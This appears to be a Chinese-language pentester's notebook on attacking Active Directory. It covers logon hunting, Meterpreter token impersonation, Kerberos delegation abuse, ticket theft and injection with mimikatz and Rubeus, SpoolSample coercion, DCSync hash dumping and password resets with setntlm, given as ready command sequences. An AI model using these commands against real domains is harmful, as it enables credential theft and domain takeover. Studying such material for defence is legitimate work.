.\PsLoggedon64.exe -l 查看本地谁登陆过<br /> ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615736093612-928fc98b-e150-4940-8e7f-da90c726157e.png#height=179&id=ze5vd&originHeight=239&originWidth=629&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16693&status=done&style=none&title=&width=472)<br />Psloggedon工具

查看域控机器有谁登陆过<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394478226-e37ba0d1-291e-467d-aa5b-cd8ae759c3a2.png#height=297&id=UGpOB&originHeight=396&originWidth=469&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=352)<br /> <br />查看用户登陆过哪台机子<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394478460-faf843ac-1712-43b6-9cf7-ff0a566135cb.png#height=218&id=MQBT0&originHeight=623&originWidth=1188&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416)<br /> 
<a name="3CIw6"></a>
#### powershell Invoke-UserHunter：找到域内特定的用户群
 需要管理员权限打开powershell，可能有报错，需要powershell的权限啥的，百度解决就ok了，输入Import-Module .\PowerView.ps1    导入脚本<br />然后输入查看域管登陆过哪个机器 Invoke-UserHunter<br />             Invoke-UserHunter -UserName "用户名"<br /> ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611847242628-6a2d98a9-e057-46aa-a9ad-fc53e67e3ae3.png#height=292&id=QGoui&originHeight=389&originWidth=581&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8599&status=done&style=none&title=&width=436)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1621680849615-e67237d4-ba84-4b94-8d51-8ab4ab030b88.png#height=111&id=i3wpW&originHeight=221&originWidth=1340&originalType=binary&ratio=1&rotation=0&showTitle=false&size=208124&status=done&style=none&title=&width=670)<br /> 
<a name="ObV24"></a>
### 模拟域管理员
<a name="XB2Aw"></a>
#### cs或者msf进程迁移到域管理员进程
cs上线后inject id 进程迁移到域管
<a name="YpNAE"></a>
##### msf
进程迁移也可以<br />migrate id<br />--------------------------------------------------------------------------<br />meterpreter > getuid  查看当前权限<br />meterpreter > use incognito #加载incognito<br />meterpreter > list_tokens -u #列出AccessToken<br />meterpreter > impersonate_token "NT AUTHORITY\SYSTEM" #模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可<br />meterpreter > rev2self #返回到之前的AccessToken权限

<a name="4qqub"></a>
#### incognito2
incognito.exe list_tokens -u<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394479070-cc6515d3-baa1-41d7-81a0-a43b290d6f16.png#height=387&id=UZAAc&originHeight=516&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=446)<br /> <br />incognito.exe execute -c "完整的Token名" cmd.exe<br />例如：模拟system权限用户<br />incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe<br /> <br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394479454-0fa54a29-4c25-454c-a89e-507d445c03b9.png#height=507&id=a9IJ3&originHeight=676&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=932)<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394479737-89f7c773-8da0-48f1-a6f3-38881c426fe4.png#height=557&id=UVAwp&originHeight=742&originWidth=1318&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=989)


<a name="aO5uF"></a>
## 域内委派攻击
[委派.xmind](https://www.yuque.com/attachments/yuque/0/2022/xmind/1345801/1667408258940-6c120f2c-1df1-4097-bc5a-d21c90d6fa19.xmind?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2022%2Fxmind%2F1345801%2F1667408258940-6c120f2c-1df1-4097-bc5a-d21c90d6fa19.xmind%22%2C%22name%22%3A%22%E5%A7%94%E6%B4%BE.xmind%22%2C%22size%22%3A242750%2C%22type%22%3A%22%22%2C%22ext%22%3A%22xmind%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22mode%22%3A%22title%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u76ca47c7-53fd-4b42-b3b5-8c9d44b371c%22%2C%22taskType%22%3A%22upload%22%2C%22__spacing%22%3A%22both%22%2C%22id%22%3A%22u7047b163%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667407823546-a3b04fe5-ee61-46b8-8f71-b44bd128cfbf.png#clientId=u935d02d8-8334-4&from=paste&height=710&id=u2ab564e3&originHeight=888&originWidth=1791&originalType=binary&ratio=1&rotation=0&showTitle=false&size=280232&status=done&style=none&taskId=u7801172e-98f3-43d9-b59f-2ba9e435d42&title=&width=1432.8)
<a name="vkGUY"></a>
### 非约束性委派攻击(没有约束，完全信任该主机所有服务)
<a name="drmuL"></a>
#### 大白话解释：
被动(需要被域管访问过服务）<br />[https://www.freebuf.com/articles/web/304850.html](https://www.freebuf.com/articles/web/304850.html)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667402966712-0dee005f-a0a4-4c96-bf3d-37146ea38bf2.png#clientId=u935d02d8-8334-4&from=paste&height=248&id=u16960648&originHeight=310&originWidth=1772&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115976&status=done&style=none&taskId=u22193a60-fe65-42a0-8e3d-9ac435615d9&title=&width=1417.6)
<a name="FurEc"></a>
#### 查询域中配置非约束委派
```
#查询域中配置非约束委派的主机
AdFind.exe -b "DC=laosec,DC=cn" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn

#查询域中配置非约束委派的服务账户
AdFind.exe -b "DC=laosec,DC=cn" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670946868929-ea5d719d-81c0-4f29-85d3-740f38b27f73.png#clientId=u4b277e6e-d297-4&from=paste&height=310&id=ud0bbb69c&originHeight=388&originWidth=1220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38215&status=done&style=none&taskId=ue2a3a945-05c2-4553-a6aa-aa7b518eea4&title=&width=976)

1.获取到目标机权限，还得要定位域管，知道域管登录过哪台机子(或者说，访问过哪些服务也行，因为访问过服务也会留下TGT票据)所以单纯的非约束委派话需要管理员主动连接，在实战环境利用比较鸡肋。<br />在域中只有服务账户才能有委派功能使用setspn  `setspn -l xxxxx`<br />2.查看域内所有非约束性的主机<br />3.mimikatz伪造TGT

是指域控**信任此计算机的任何服务 (一般其他主机是 不信任委派的)**<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611672313310-43860165-678e-4d3b-9ce4-853fcba5e2a9.png#height=353&id=eHoHZ&originHeight=470&originWidth=528&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27726&status=done&style=none&title=&width=396)<br />先查看域内非约束性委派的主机账号，如下(域控默认是设置为非约束性委派)。<br />无需管理员启动。否则system权限无法访问域<br />使用powerviewer.ps1脚本导入。<br />Get-NetComputer -Unconstrained -Domain xxx.com

或者用Adfind.exe查找配置了非约束委派的主机<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667371007344-ef75b064-dfa6-402e-bfd4-648eec9b7fe2.png#clientId=u4b3edc4b-7b6b-4&from=paste&height=186&id=uf14ab605&originHeight=232&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26942&status=done&style=none&taskId=uba444231-f942-4679-8861-9dfad4fcad5&title=&width=583.2)

如果域管身份test登陆过这台机子在主机win7的lsass.exe内存中就会有域管test的TGT票据。我们在win7上以本地管理员权限运行mimikatz，执行以下命令
> privilege::debug
> 导出票据
> sekurlsa::tickets /export



可以看到会生成一个 test@krbtgt 的票据 (在mimikatz的目录下生成的票据)

我们用 mimikatz 将这个票据导入内存中，然后访问域控。需要主机访问，ip无法成功

> 导入票据
> kerberos::ptt [0;89b3d]-2-0-60a00000-test@krbtgt-xxxx.COM.kirbi
> **如果是注入域管的票据，其实可以直接导出所有hash**
> **lsadump::dcsync /domain:xxx.com /all /csv**
> 查看票据
> kerberos::list


<a name="HMum9"></a>
### 非约束委派&Spooler(未成功
<a name="bAl75"></a>
#### 大白话解释：
这个是强迫域控访问服务

参考：<br />[https://www.cnblogs.com/Yang34/p/14264356.html](https://www.cnblogs.com/Yang34/p/14264356.html)<br />[https://xz.aliyun.com/t/7217#toc-8](https://xz.aliyun.com/t/7217#toc-8)<br />默认情况下Spooler服务为自动启动 <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626103945611-b1a05267-ee3e-43ed-8f27-30492500b698.png#averageHue=%23d8d2cf&height=399&id=H4dxp&originHeight=399&originWidth=406&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24885&status=done&style=none&title=&width=406)<br />通过SpoolSample.exe，向域控发起请求，强制其访问PC进行身份验证，此次更换了多个环境，均出现报错，只能先记录下攻击手法：

强制域控机器名向B机器名发起身份验证<br />SpoolSample.exe 域控机器名 B机器名

```
后续用Rubeus来监听事件id为4624的事件，可以第一事件截取到域控的TGT，监听来自域控OWA2013的登录
Rubeus.exe monitor /interval:1 /filteruser:域控机器名$

后续再Rubeus导入base64的票据直接注入进内存
Rubeus.exe ptt /ticket:base64
用mimikatz也可
privilege::debug
sekurlsa::tickets /export

导入票据后ptt即可
kerberos::ptt XXX.kirbi
lsadump::dcsync /domain:rootkit.org /all /csv
```
<a name="8BaI4"></a>
### 约束性委派攻击(优先打这个
[域渗透-委派攻击 - FreeBuf网络安全行业门户 (2022_11_2 17_13_00).html](https://www.yuque.com/attachments/yuque/0/2022/html/1345801/1667380455611-b48d0470-752b-4df4-8cd8-f3a24b875a03.html?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2022%2Fhtml%2F1345801%2F1667380455611-b48d0470-752b-4df4-8cd8-f3a24b875a03.html%22%2C%22name%22%3A%22%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%20-%20FreeBuf%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E9%97%A8%E6%88%B7%20(2022_11_2%2017_13_00).html%22%2C%22size%22%3A8165874%2C%22type%22%3A%22text%2Fhtml%22%2C%22ext%22%3A%22html%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22mode%22%3A%22title%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u4aaa75bb-4ca4-4eaf-aa4c-839b93ff4af%22%2C%22taskType%22%3A%22upload%22%2C%22__spacing%22%3A%22both%22%2C%22id%22%3A%22ufbcbe3e9%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)(这文章不错，但是基于资源委派这一块还是差了点)<br />[https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ](https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ) 实战案例，不错

主动(只要设置了CIFS能访问域控，就能打<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667405514593-aa06dfc9-acc8-4c95-baef-3f4fcf47df5e.png#averageHue=%23f3f3f3&clientId=u935d02d8-8334-4&from=paste&height=156&id=ud50758db&originHeight=195&originWidth=1809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76417&status=done&style=none&taskId=u098b0f3e-9fb5-4557-9392-7fedcf53e9c&title=&width=1447.2)
<a name="Td3S8"></a>
#### 查询域中配置约束委派
```
#查询域中配置约束委派的主机
AdFind.exe -b "DC=warsec,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" -dn

#查询域中配置约束委派的服务账户
AdFind.exe -b "DC=warsec,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" -dn
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670946963726-67186199-bc1d-45f8-9d7c-aefaddc11d06.png#averageHue=%23050403&clientId=u4b277e6e-d297-4&from=paste&height=243&id=u3117e18d&originHeight=304&originWidth=1038&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29773&status=done&style=none&taskId=ub2c34306-c609-4107-9172-9b7f1e2c66c&title=&width=830.4)[<br />](https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ)

<a name="kZD6r"></a>
#### 大白话解释：
1、 约束委派需要知道SQL服务账户的密码或者Hash值

就是获取到了某个域内的服务账户密码(就是你拿到个服务的账户密码，像mssql之类的账号密码在SPN里的）**并且配置了到域控的CIFS服务的约束性委派**。则攻击者可以利用服务以administrator身份访问域控的CIFS服务即相当于控制了域控<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667380507785-eb4f8e52-7224-4713-bdf0-a4c0b100b863.png#averageHue=%23f6f3f1&clientId=u9805dca9-4f9e-4&from=paste&height=510&id=ufc0dbe8d&originHeight=638&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&size=297867&status=done&style=none&taskId=u4484e2af-57e2-4f48-a00d-2aaeb85708c&title=&width=861.6)

<a name="zqGru"></a>
### 基于资源约束性委派

这两篇文章非常的好！<br />[https://skewwg.github.io/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/](https://skewwg.github.io/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/)<br />[https://blog.csdn.net/qq_44159028/article/details/124118253](https://blog.csdn.net/qq_44159028/article/details/124118253)


[https://www.freebuf.com/articles/web/303666.html](https://www.freebuf.com/articles/web/303666.html) (假设我们拿到一个域用户的帐户，我们想要进行基于资源的委派攻击，首先要先查看一下当前账户可以修改谁的msds-allowedtoactonbehalfofotheridentity属性值。)

<a name="HBToy"></a>
#### 大白话解释：
就是b在域内(可以添加其他机器入域) 如果拿下b，就能拿下他添加的拿下入域的主机

就是b把c、d都拉进域了，如果有b的域账号密码，就能通过添加服务资源委派到c、d从而拿下c、d的域主机权限<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667437715602-3c0a188a-cb05-4377-acc2-e99a0d72179e.png#averageHue=%23f5f5f5&clientId=u935d02d8-8334-4&from=paste&height=329&id=u032510b2&originHeight=411&originWidth=1613&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118086&status=done&style=none&taskId=ue128fa9f-e03e-4cee-aa18-60695780349&title=&width=1290.4)

ADExplorer64.exe 工具进行sid查找<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667451313210-2c72cfac-3904-4536-b8dc-9a5a804bb241.png#averageHue=%23f6f6f6&clientId=u46d285b9-cc45-4&from=paste&height=507&id=ufb0e630f&originHeight=634&originWidth=1243&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102989&status=done&style=none&taskId=ucd4c9ce2-59c2-4d05-b191-cefb5bc3f88&title=&width=994.4)
<a name="Z5S0A"></a>
#### 查询域中配置基于资源约束委派
```
#查询域中配置基于资源约束委派的主机
AdFind.exe -b "DC=warsec,DC=com" -f "(&(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" -dn

#查询域中配置基于资源约束委派的服务账户
AdFind.exe -b "DC=warsec,DC=com" -f "(&(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" -dn
```

<a name="CjJ4F"></a>
#### 通过基于资源的约束委派获取域管权限

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670945359843-d077eed1-902c-4303-804e-4532fd00ae74.png#averageHue=%23032759&clientId=ud4df63ae-2604-4&from=paste&height=468&id=u42821dca&originHeight=585&originWidth=1231&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102450&status=done&style=none&taskId=uf2097e98-873a-4575-94bf-55f1f9c722c&title=&width=984.8)

![4b869dd3124e837d2486e57f8d6e9be.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670945472652-107c4681-b408-4d2b-bd8b-7180c1edd953.png#averageHue=%2304295b&clientId=ud4df63ae-2604-4&from=paste&height=222&id=u029e4a3e&originHeight=277&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64688&status=done&style=none&taskId=uce74bf93-a891-4cfb-80f2-0eb2d14c4cd&title=&width=728)

![b447a963923fc5fff29595fa96f5727.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/1345801/1670945422046-ae8f34ca-50fc-4847-b379-3ee3eacbf14e.jpeg#averageHue=%23145a93&clientId=ud4df63ae-2604-4&from=paste&height=257&id=u9654a072&originHeight=321&originWidth=775&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38819&status=done&style=none&taskId=u95c883b3-41b7-4d38-9aaa-38b40277351&title=&width=620)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667452373050-3fcf36ee-9f11-460e-8952-804faaf27964.png#clientId=u46d285b9-cc45-4&from=paste&height=234&id=ubef9aa8a&originHeight=293&originWidth=1021&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82787&status=done&style=none&taskId=uc0ba9723-988d-4a00-a2c2-ed05d3ae29a&title=&width=816.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667452386660-7ab61760-4c39-473f-b13c-713690fea571.png#clientId=u46d285b9-cc45-4&from=paste&height=594&id=u1e91861c&originHeight=743&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=194279&status=done&style=none&taskId=u369ebe0e-e9e9-4947-b862-63a8731c67f&title=&width=641.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667452407476-1e2b6201-d3eb-420c-920c-4ce6eb0f5701.png#clientId=u46d285b9-cc45-4&from=paste&height=361&id=u3f9dc5cd&originHeight=451&originWidth=786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=154908&status=done&style=none&taskId=u0b8928be-df98-4fdc-884c-8b6bda0c9c4&title=&width=628.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667452416899-b288fc8e-7bf9-4e45-bb28-d2047829184a.png#clientId=u46d285b9-cc45-4&from=paste&height=628&id=ud9cb8839&originHeight=785&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=173844&status=done&style=none&taskId=uc155f0cf-b919-43e2-9e14-753a981271a&title=&width=641.6)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667452433521-2979ea90-0484-4738-82a5-e414d8894ffa.png#clientId=u46d285b9-cc45-4&from=paste&height=650&id=ued8ac432&originHeight=812&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&size=208475&status=done&style=none&taskId=u85c2f905-f849-40be-aa1f-ab23933a89b&title=&width=664.8)




![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667722376516-891b074a-4a8d-48cf-a2e0-a32a34016630.png#clientId=u9ad29344-ed45-4&from=paste&height=585&id=uee742166&originHeight=731&originWidth=1347&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223565&status=done&style=none&taskId=u9307eac2-8891-4c0e-8199-d713f3bf80e&title=&width=1077.6)

<a name="PSCtU"></a>
### LDAP RELAY+基于资源的约束委派
[https://www.cnblogs.com/zpchcbd/p/12963328.html](https://www.cnblogs.com/zpchcbd/p/12963328.html)<br />[https://www.cnblogs.com/sup3rman/p/16114572.html](https://www.cnblogs.com/sup3rman/p/16114572.html)
<a name="activity-name"></a>
## SPN 与 Kerberoast 攻击 
[https://mp.weixin.qq.com/s/suBWSk__dSjH2O2gmKwiDA](https://mp.weixin.qq.com/s/suBWSk__dSjH2O2gmKwiDA)

<a name="n1Akv"></a>
## Windows Print Spooler权限提升漏洞
Server2012只能上传恶意dll，不能执行上线，08未攻击成功。匿名主机成功率需要在linux机子开启smba匿名服务。<br />[https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w](https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w)

ADCS

<a name="aW8Ii"></a>
## 域内重置密码
[https://www.freebuf.com/articles/network/285345.html](https://www.freebuf.com/articles/network/285345.html)<br />原理是利用MS-SAMR协议<br />域管权限修改域用户密码不受策略限制，如果是用户修改自己的密码可能受时间限制

1、先看看目标机器账户或者用户的原始hash<br />2、重置明文密码<br />lsadump::setntlm /server:<DC's_IP_or_FQDN> /user:<username> /password:<new_password><br />3、还原初始hash<br />lsadump::setntlm /server:<DC's_IP_or_FQDN> /user:<username> /ntlm:<Original_Hash>

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1670558492814-55ee5c94-92f2-4244-946e-401b4a748de6.png#clientId=ua79850af-54fe-4&from=paste&height=630&id=ub5df3d9a&originHeight=787&originWidth=818&originalType=binary&ratio=1&rotation=0&showTitle=false&size=263668&status=done&style=none&taskId=ud046780c-29d6-438d-bcd3-da912f56e19&title=&width=654.4)
